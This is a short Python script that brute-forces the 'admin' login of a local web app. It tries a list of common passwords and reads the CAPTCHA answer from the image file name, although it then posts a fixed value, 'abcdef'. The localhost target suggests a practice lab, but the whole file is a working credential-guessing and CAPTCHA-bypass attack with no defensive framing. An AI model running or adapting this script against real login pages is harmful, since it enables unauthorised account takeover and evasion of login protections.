import requests
import webbrowser
from bs4 import BeautifulSoup

URL = "http://127.0.0.1:5000/"
USERNAME = "admin"
PASSWORD_LIST = [
    "12345",
    "admin",
    "123456",
    "password",
    "qwerty",
    "letmein",
    "welcome",
    "abc123",
    "123456789",
]

session = requests.Session()

for password in PASSWORD_LIST:
    response = session.get(URL)
    soup = BeautifulSoup(response.text, "html.parser")

    captcha_img_tag = soup.find("img")
    if captcha_img_tag:
        captcha_src = captcha_img_tag["src"]
        captcha_text = captcha_src.split("/")[-1].split(".")[0]
        print(f"🔍 Current CAPTCHA: {captcha_text}")
    else:
        print("⚠ CAPTCHA not found!")
        break

    response = session.post(
        URL, data={"username": USERNAME, "password": password, "captcha": "abcdef"}
    )

    if "Welcome! You have successfully logged in." in response.text:
        print(f"🔓 Bot successfully logged in with password: {password}")
        webbrowser.open("http://127.0.0.1:5000/welcome-bf")
        break
    else:
        print(f"❌ Attempt with password {password} failed")
